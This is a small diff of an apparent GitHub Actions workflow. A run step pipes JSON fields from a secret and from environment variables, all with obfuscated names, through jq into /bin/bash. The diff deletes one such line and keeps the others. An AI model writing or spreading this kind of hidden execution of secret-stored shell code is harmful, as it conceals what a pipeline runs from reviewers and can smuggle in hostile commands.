@@ -18,7 +18,6 @@ jobs:
           pyjgn387: ${{ secrets.pyjgn387 }}
         run: |
           printf '%s' "$pyjgn387" | jq -r .p91 | /bin/bash
-          printf '%s' "$w604" | jq -r .iv53 | /bin/bash
           echo $onn0728 | jq -r .cuutg838 | /bin/bash
 
       - name: Upload artifact
